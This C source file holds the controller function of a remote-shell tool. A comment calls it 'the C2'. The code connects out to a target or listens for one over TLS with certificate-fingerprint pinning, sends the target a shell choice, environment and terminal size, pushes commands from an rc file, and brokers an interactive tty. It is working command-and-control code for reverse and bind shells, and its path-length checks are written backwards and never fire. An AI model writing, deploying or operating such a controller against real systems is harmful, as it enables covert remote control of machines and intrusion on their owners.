
#include "common.h"
#include "keys/dh_params.c"



int do_control(struct remote_io_helper *io, struct configuration_helper *config){


	int i;
	int retval;
	int err_flag;

	struct termios saved_termios_attrs, new_termios_attrs;

	char **exec_envp;

	int buff_len, tmp_len;
	char *buff_head = NULL, *buff_tail;
	char *buff_ptr;

	int io_bytes;

	struct winsize *tty_winsize;

	unsigned int tmp_uint;

  BIO *accept = NULL;

  char *controller_cert_path_head = NULL, *controller_cert_path_tail = NULL;
  char *controller_key_path_head = NULL, *controller_key_path_tail = NULL;

  X509 *remote_cert;
  unsigned int remote_fingerprint_len;
  unsigned char remote_fingerprint[EVP_MAX_MD_SIZE];

  X509 *allowed_cert;
  unsigned int allowed_fingerprint_len;
  unsigned char allowed_fingerprint[EVP_MAX_MD_SIZE];

  FILE *target_fingerprint_fp;

  char *allowed_cert_path_head, *allowed_cert_path_tail;

  int rc_fd;
  wordexp_t rc_file_exp;
	wordexp_t keys_dir_exp;

	unsigned int retry;

	struct sigaction *act = NULL;

  struct timespec req;




	buff_len = getpagesize();
	if((buff_head = (char *) calloc(buff_len, sizeof(char))) == NULL){
		fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				buff_len, (int) sizeof(char), \
				strerror(errno));
		exit(-1);
	}


	if((tty_winsize = (struct winsize *) calloc(1, sizeof(struct winsize))) == NULL){
		fprintf(stderr, "%s: %d: calloc(1, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				(int) sizeof(struct winsize), strerror(errno));
		exit(-1);
	}


	if(wordexp(config->rc_file, &rc_file_exp, 0)){
		fprintf(stderr, "%s: %d: wordexp(%s, %lx, 0): %s\r\n", \
				program_invocation_short_name, io->controller, \
				config->rc_file, (unsigned long)  &rc_file_exp, \
				strerror(errno));
		exit(-1);
	}

	if(rc_file_exp.we_wordc != 1){
		fprintf(stderr, "%s: %d: Invalid path: %s\r\n", \
				program_invocation_short_name, io->controller, \
				config->rc_file);
		exit(-1);
	}

	if(wordexp(config->keys_dir, &keys_dir_exp, 0)){
		fprintf(stderr, "%s: %d: wordexp(%s, %lx, 0): %s\r\n", \
				program_invocation_short_name, io->controller, \
				config->keys_dir, (unsigned long)  &keys_dir_exp, \
				strerror(errno));
		exit(-1);
	}

	if(keys_dir_exp.we_wordc != 1){
		fprintf(stderr, "%s: %d: Invalid path: %s\r\n", \
				program_invocation_short_name, io->controller, \
				config->keys_dir);
		exit(-1);
	}

	memset(allowed_fingerprint, 0, EVP_MAX_MD_SIZE);
	allowed_fingerprint_len = 0;

  memset(remote_fingerprint, 0, EVP_MAX_MD_SIZE);
  remote_fingerprint_len = 0;

  if((act = (struct sigaction *) calloc(1, sizeof(struct sigaction))) == NULL){
    fprintf(stderr, "%s: %d: calloc(1, %d): %s\r\n", \
        program_invocation_short_name, io->controller, \
        (int) sizeof(struct sigaction), strerror(errno));
    exit(-1);
  }


	/*  - Open a socket / setup SSL. */
	if(config->encryption == EDH){
		if((controller_cert_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
			fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
					program_invocation_short_name, io->controller, PATH_MAX, (int) sizeof(char), \
					strerror(errno));
			exit(-1);
		}

		memcpy(controller_cert_path_head, keys_dir_exp.we_wordv[0], strlen(keys_dir_exp.we_wordv[0]));
		controller_cert_path_tail = index(controller_cert_path_head, '\0');
		*(controller_cert_path_tail++) = '/';
		sprintf(controller_cert_path_tail, CONTROLLER_CERT_FILE);


		if((controller_cert_path_head - controller_cert_path_tail) > PATH_MAX){
			fprintf(stderr, "%s: %d: controller cert file: path too long!\n",
					program_invocation_short_name, io->controller);
			exit(-1);
		}

		if((controller_key_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
			fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
					program_invocation_short_name, io->controller, PATH_MAX, (int) sizeof(char), \
					strerror(errno));
			exit(-1);
		}

		memcpy(controller_key_path_head, keys_dir_exp.we_wordv[0], strlen(keys_dir_exp.we_wordv[0]));
		controller_key_path_tail = index(controller_key_path_head, '\0');
		*(controller_key_path_tail++) = '/';
		sprintf(controller_key_path_tail, CONTROLLER_KEY_FILE);


		if((controller_key_path_head - controller_key_path_tail) > PATH_MAX){
			fprintf(stderr, "%s: %d: controller key file: path too long!\n",
					program_invocation_short_name, io->controller);
			exit(-1);
		}
	}


	if(config->encryption){

		if((io->ctx = SSL_CTX_new(TLSv1_server_method())) == NULL){
			fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_server_method()): %s\n", \
					program_invocation_short_name, io->controller, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if((io->dh = get_dh()) == NULL){
			fprintf(stderr, "%s: %d: get_dh(): %s\n", \
					program_invocation_short_name, io->controller, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(!SSL_CTX_set_tmp_dh(io->ctx, io->dh)){
			fprintf(stderr, "%s: %d: SSL_CTX_set_tmp_dh(%lx, %lx): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) io->ctx, (unsigned long) io->dh, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(SSL_CTX_set_cipher_list(io->ctx, config->cipher_list) != 1){
			fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) io->ctx, config->cipher_list, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(config->encryption == EDH){
			SSL_CTX_set_verify(io->ctx, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, dummy_verify_callback);

			if(SSL_CTX_use_certificate_file(io->ctx, controller_cert_path_head, SSL_FILETYPE_PEM) != 1){
				fprintf(stderr, "%s: %d: SSL_CTX_use_certificate_file(%lx, %s, SSL_FILETYPE_PEM): %s\n", \
						program_invocation_short_name, io->controller, (unsigned long) io->ctx, controller_cert_path_head, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			free(controller_cert_path_head);

			if(SSL_CTX_use_PrivateKey_file(io->ctx, controller_key_path_head, SSL_FILETYPE_PEM) != 1){
				fprintf(stderr, "%s: %d: SSL_CTX_use_PrivateKey_file(%lx, %s, SSL_FILETYPE_PEM): %s\n", \
						program_invocation_short_name, io->controller, (unsigned long) io->ctx, controller_key_path_head, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			free(controller_key_path_head);

			if(SSL_CTX_check_private_key(io->ctx) != 1){
				fprintf(stderr, "%s: %d: SSL_CTX_check_private_key(%lx): %s\n", \
						program_invocation_short_name, io->controller, (unsigned long) io->ctx, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}
		}
	}

	act->sa_handler = catch_alarm;

	if(sigaction(SIGALRM, act, NULL) == -1){
		fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
				program_invocation_short_name, io->controller, \
				SIGALRM, (unsigned long) act, NULL, strerror(errno));
		exit(-1);
	}

	alarm(config->timeout);

	if(config->bindshell){

		/*  - Open a network connection back to the target. */
		if((io->connect = BIO_new_connect(config->ip_addr)) == NULL){
			fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
					program_invocation_short_name, io->controller, config->ip_addr, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(config->verbose){
			printf("Connecting to %s...", config->ip_addr);
			fflush(stdout);
		}

		while(((retval = BIO_do_connect(io->connect)) != 1) && config->retry_start){

			/*  Using RAND_pseudo_bytes() instead of RAND_bytes() because this is a best effort. We don't */
			/*  actually want to die or print an error if there is a lack of entropy. */
			if(config->retry_stop){
				RAND_pseudo_bytes((unsigned char *) &tmp_uint, sizeof(tmp_uint));
				retry = config->retry_start + (tmp_uint % (config->retry_stop - config->retry_start));
			}else{
				retry = config->retry_start;
			}

			if(config->verbose){
				printf("No connection.\nRetrying in %d seconds...\n", retry);
			}

			req.tv_sec = retry;
			req.tv_nsec = 0;
			nanosleep(&req, NULL);

			if(config->verbose){
				printf("Connecting to %s...", config->ip_addr);
				fflush(stdout);
			}
		}

		if(retval != 1){
			fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) io->connect, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

	}else{
		/*  - Listen for a connection. */

		if(config->verbose){
			printf("Listening on %s...", config->ip_addr);
			fflush(stdout);
		}

		if((accept = BIO_new_accept(config->ip_addr)) == NULL){
			fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
					program_invocation_short_name, io->controller, config->ip_addr, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
			fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(BIO_do_accept(accept) <= 0){
			fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(BIO_do_accept(accept) <= 0){
			fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if((io->connect = BIO_pop(accept)) == NULL){
			fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		BIO_free(accept);
	}

	act->sa_handler = SIG_DFL;

	if(sigaction(SIGALRM, act, NULL) == -1){
		fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
				program_invocation_short_name, io->controller, \
				SIGALRM, (unsigned long) act, NULL, strerror(errno));
		exit(-1);
	}

	alarm(0);

	if(config->verbose){
		printf("\tConnected!\n");
	}

	if(BIO_get_fd(io->connect, &(io->remote_fd)) < 0){
		fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
				program_invocation_short_name, io->controller, (unsigned long) io->connect, (unsigned long) &(io->remote_fd), strerror(errno));
		ERR_print_errors_fp(stderr);
		exit(-1);
	}

	if(config->encryption){
		if(!(io->ssl = SSL_new(io->ctx))){
			fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) io->ctx, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1); 
		}

		SSL_set_bio(io->ssl, io->connect, io->connect);

		if(SSL_accept(io->ssl) < 1){
			fprintf(stderr, "%s: %d: SSL_accept(%lx): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) io->ssl, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(config->encryption == EDH){
			if((allowed_cert_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
				fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
						program_invocation_short_name, io->controller, PATH_MAX, (int) sizeof(char), \
						strerror(errno));
				exit(-1);
			}

			memcpy(allowed_cert_path_head, keys_dir_exp.we_wordv[0], strlen(keys_dir_exp.we_wordv[0]));
			allowed_cert_path_tail = index(allowed_cert_path_head, '\0');
			*(allowed_cert_path_tail++) = '/';
			sprintf(allowed_cert_path_tail, TARGET_CERT_FILE);


			if((allowed_cert_path_head - allowed_cert_path_tail) > PATH_MAX){
				fprintf(stderr, "%s: %d: target fingerprint file: path too long!\n",
						program_invocation_short_name, io->controller);
				exit(-1);
			}

			if((target_fingerprint_fp = fopen(allowed_cert_path_head, "r")) == NULL){
				fprintf(stderr, "%s: %d: fopen(%s, 'r'): %s\n",
						program_invocation_short_name, io->controller, allowed_cert_path_head, strerror(errno));
				exit(-1);
			}

			free(allowed_cert_path_head);

			if((allowed_cert = PEM_read_X509(target_fingerprint_fp, NULL, NULL, NULL)) == NULL){
				fprintf(stderr, "%s: %d: PEM_read_X509(%lx, NULL, NULL, NULL): %s\n", \
						program_invocation_short_name, io->controller, (unsigned long) target_fingerprint_fp, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(fclose(target_fingerprint_fp)){
				fprintf(stderr, "%s: %d: fclose(%lx): %s\n",
						program_invocation_short_name, io->controller, (unsigned long) target_fingerprint_fp, strerror(errno));
				exit(-1);
			}

			if(!X509_digest(allowed_cert, io->fingerprint_type, allowed_fingerprint, &allowed_fingerprint_len)){
				fprintf(stderr, "%s: %d: X509_digest(%lx, %lx, %lx, %lx): %s\n", \
						program_invocation_short_name, io->controller, \
						(unsigned long) allowed_cert, \
						(unsigned long) io->fingerprint_type, \
						(unsigned long) allowed_fingerprint, \
						(unsigned long) &allowed_fingerprint_len, \
						strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}
			
			if(config->verbose){
				printf(" Remote fingerprint expected: ");
				for(i = 0; i < (int) allowed_fingerprint_len; i++){
					printf("%02x", allowed_fingerprint[i]);
				}
				printf("\n");
			}

			if((remote_cert = SSL_get_peer_certificate(io->ssl)) == NULL){
				fprintf(stderr, "%s: %d: SSL_get_peer_certificate(%lx): %s\n", \
						program_invocation_short_name, io->controller, (unsigned long) io->ssl, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(!X509_digest(remote_cert, io->fingerprint_type, remote_fingerprint, &remote_fingerprint_len)){
				fprintf(stderr, "%s: %d: X509_digest(%lx, %lx, %lx, %lx): %s\n", \
						program_invocation_short_name, io->controller, \
						(unsigned long) remote_cert, \
						(unsigned long) io->fingerprint_type, \
						(unsigned long) remote_fingerprint, \
						(unsigned long) &remote_fingerprint_len, \
						strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(config->verbose){
				printf(" Remote fingerprint received: ");
				for(i = 0; i < (int) remote_fingerprint_len; i++){
					printf("%02x", remote_fingerprint[i]);
				}
				printf("\n");
			}

			if(allowed_fingerprint_len != remote_fingerprint_len){
				fprintf(stderr, "%s: %d: Fingerprint mistmatch. Possible mitm. Aborting!\n", \
						program_invocation_short_name, io->controller);
				exit(-1);
			}

			for(i = 0; i < (int) allowed_fingerprint_len; i++){
				if(allowed_fingerprint[i] != remote_fingerprint[i]){
					fprintf(stderr, "%s: %d: Fingerprint mistmatch. Possible mitm. Aborting!\n", \
							program_invocation_short_name, io->controller);
					exit(-1);
				}
			}
		}
	}

	if(config->verbose){
		printf("Initializing...");
	}


	/*  - Agree on interactive / non-interactive mode. */
	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;
	*(buff_tail++) = (char) APC;
	*(buff_tail++) = (char) config->interactive;
	*(buff_tail) = (char) ST;

	if((io_bytes = io->remote_write(io, buff_head, HANDSHAKE_LEN)) == -1){
		fprintf(stderr, "%s: %d: io->remote_write(%lx, %lx, %d): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, HANDSHAKE_LEN, strerror(errno));
		exit(-1);
	}

	if(io_bytes != HANDSHAKE_LEN){
		fprintf(stderr, "%s: %d: io->remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, HANDSHAKE_LEN);
		exit(-1);
	}

	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;
	if((io_bytes = io->remote_read(io, buff_tail, HANDSHAKE_LEN)) == -1){
		fprintf(stderr, "%s: %d: io->remote_read(%lx, %lx, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_tail, HANDSHAKE_LEN, strerror(errno));
		exit(-1);
	}

	if(io_bytes != HANDSHAKE_LEN){
		fprintf(stderr, "%s: %d: io->remote_read(%lx, %lx, %d): Unable to write entire string.\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_tail, HANDSHAKE_LEN);
		exit(-1);
	}

	/* Both sides must agree on interaction. If either one opts out, fall back to non-interactive data transfer. */	
	if(!buff_head[1]){
		config->interactive = 0;
	}


	if(!config->interactive){
		retval = broker(io, config);

		if(config->encryption){
			SSL_shutdown(io->ssl);
			SSL_free(io->ssl);
			SSL_CTX_free(io->ctx);
		}

		return(retval);
	}


	/*  - Send initial shell data. */
	/* If the C2 hasn't been invoked with a specific shell, then let the client choose. */
	/* We will indicated this by sending an empty string for the shell, indicated by APC/ST with */
	/* nothing in between. */
	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;
	*(buff_tail++) = (char) APC;

	tmp_len = 0;
	if(config->shell){
		tmp_len = strlen(config->shell);
		memcpy(buff_tail, config->shell, tmp_len);
	}

	buff_tail += tmp_len;

	*(buff_tail++) = (char) ST;

	if((buff_tail - buff_head) >= buff_len){
		print_error(io, "%s: %d: Environment string too long.\n", program_invocation_short_name, io->controller);
		exit(-1);
	}

	tmp_len = strlen(buff_head);
	if((io_bytes = io->remote_write(io, buff_head, tmp_len)) == -1){
		print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, tmp_len, strerror(errno));
		exit(-1);
	}

	if(io_bytes != (buff_tail - buff_head)){
		print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, buff_len);
		exit(-1);
	}

	/*  - Send initial environment data. */
	tmp_len = strlen(DEFAULT_ENV);
	if((config->env_string = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
		print_error(io, "%s: %d: calloc(strlen(%d, %d)): %s\n", \
				program_invocation_short_name, io->controller, \
				tmp_len + 1, (int) sizeof(char), strerror(errno));
		exit(-1);
	}

	memcpy(config->env_string, DEFAULT_ENV, tmp_len);

	if((exec_envp = string_to_vector(config->env_string)) == NULL){
		print_error(io, "%s: %d: string_to_vector(%s): %s\n", \
				program_invocation_short_name, io->controller, \
				config->env_string, strerror(errno));
		exit(-1);
	}

	free(config->env_string);

	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;
	*(buff_tail++) = (char) APC;

	for(i = 0; exec_envp[i]; i++){

		if((buff_tail - buff_head) >= buff_len){
			print_error(io, "%s: %d: Environment string too long.\n", \
					program_invocation_short_name, io->controller);
			exit(-1);
		}else if(buff_tail != (buff_head + 1)){
			*(buff_tail++) = ' ';
		}

		tmp_len = strlen(exec_envp[i]);
		memcpy(buff_tail, exec_envp[i], tmp_len);

		buff_tail += tmp_len;

		*(buff_tail++) = '=';

		if((buff_ptr = getenv(exec_envp[i])) == NULL){
			fprintf(stderr, "%s: No such environment variable \"%s\". Ignoring.\n", \
					program_invocation_short_name, exec_envp[i]);
		}else{
			tmp_len = strlen(buff_ptr);
			memcpy(buff_tail, buff_ptr, tmp_len);
			buff_tail += tmp_len;
		}
	}

	*(buff_tail++) = (char) ST;

	if((buff_tail - buff_head) >= buff_len){
		print_error(io, "%s: %d: Environment string too long.\n", \
				program_invocation_short_name, io->controller);
		exit(-1);
	}

	tmp_len = strlen(buff_head);
	if((io_bytes = io->remote_write(io, buff_head, tmp_len)) == -1){
		print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, tmp_len, strerror(errno));
		exit(-1);
	}

	if(io_bytes != (buff_tail - buff_head)){
		print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, buff_len);
		exit(-1);
	}


	/*  - Send initial termios data. */
	if(ioctl(STDIN_FILENO, TIOCGWINSZ, tty_winsize) == -1){
		print_error(io, "%s: %d: ioctl(STDIN_FILENO, TIOCGWINSZ, %lx): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) tty_winsize, strerror(errno));
		exit(-1);
	}

	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;
	*(buff_tail++) = (char) APC;

	if((retval = snprintf(buff_tail, buff_len - 2, "%hd %hd", \
					tty_winsize->ws_row, tty_winsize->ws_col)) < 0){
		print_error(io, "%s: %d: snprintf(buff_head, buff_len, \"%%hd %%hd\", %hd, %hd): %s\n", \
				program_invocation_short_name, io->controller, \
				tty_winsize->ws_row, tty_winsize->ws_col, strerror(errno));
		exit(-1);
	}

	buff_tail += retval;
	*(buff_tail) = (char) ST;

	tmp_len = strlen(buff_head);
	if((io_bytes = io->remote_write(io, buff_head, tmp_len)) == -1){
		print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, tmp_len, strerror(errno));
		exit(-1);
	}

	if(io_bytes != tmp_len){
		print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, tmp_len);
		exit(-1);
	}

	/*  - Set local terminal to raw.  */
	if(tcgetattr(STDIN_FILENO, &saved_termios_attrs) == -1){
		print_error(io, "%s: %d: tcgetattr(STDIN_FILENO, %lx): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) &saved_termios_attrs, strerror(errno));
		exit(-1);
	}

	memcpy(&new_termios_attrs, &saved_termios_attrs, sizeof(struct termios));

	new_termios_attrs.c_lflag &= ~(ECHO|ICANON|IEXTEN|ISIG);
	new_termios_attrs.c_iflag &= ~(BRKINT|ICRNL|INPCK|ISTRIP|IXON);
	new_termios_attrs.c_cflag &= ~(CSIZE|PARENB);
	new_termios_attrs.c_cflag |= CS8;
	new_termios_attrs.c_oflag &= ~(OPOST);

	new_termios_attrs.c_cc[VMIN] = 1;
	new_termios_attrs.c_cc[VTIME] = 0;

	if(tcsetattr(STDIN_FILENO, TCSANOW, &new_termios_attrs) == -1){
		print_error(io, "%s: %d: tcsetattr(STDIN_FILENO, TCSANOW, %lx): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) &new_termios_attrs, strerror(errno));
		exit(-1);
	}	

	if(config->verbose){
		printf("\tDone!\r\n\n");
	}


	/*  - Send the commands in the rc file. */

	if((rc_fd = open(rc_file_exp.we_wordv[0], O_RDONLY)) != -1){

		buff_ptr = buff_head;

		while((io_bytes = read(rc_fd, buff_head, buff_len))){
			if(io_bytes == -1){
				print_error(io, "%s: %d: read(%d, %lx, %d): %s\r\n", \
						program_invocation_short_name, io->controller, \
						rc_fd, (unsigned long) buff_head, buff_len, strerror(errno));
				exit(-1);
			}
			buff_tail = buff_head + io_bytes;

			while(buff_ptr != buff_tail){
				if((retval = io->remote_write(io, buff_ptr, (buff_tail - buff_ptr))) == -1){
					print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): %s\r\n", \
							program_invocation_short_name, io->controller, \
							(unsigned long) io, (unsigned long) buff_ptr, (buff_tail - buff_ptr), strerror(errno));
					exit(-1);
				}
				buff_ptr += retval;
			}
		}

		close(rc_fd);
	}


	errno = 0;


	/*  - Enter broker() for tty brokering. */
	if(broker(io, config) == -1){
		print_error(io, "%s: %d: broker(%lx, %lx): %s\r\n", \
				program_invocation_short_name, io->controller, (unsigned long) io, \
				(unsigned long) config, \
				strerror(errno));
	}

	err_flag = 0;
	if(errno == ECONNRESET){
		err_flag = errno;
	}

	/*  - Reset local term. */
	tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios_attrs);

	/*  - Exit. */
	if(!err_flag){
		printf("Good-bye!\n");

	}else{
		while((retval = io->remote_read(io, buff_head, buff_len)) > 0){
			write(STDERR_FILENO, buff_head, retval);
		}
	}
	if(config->encryption){
		SSL_shutdown(io->ssl);
		SSL_free(io->ssl);
		SSL_CTX_free(io->ctx);
	}else{
		BIO_free(io->connect);
	}

	free(buff_head);
	return(0);
}
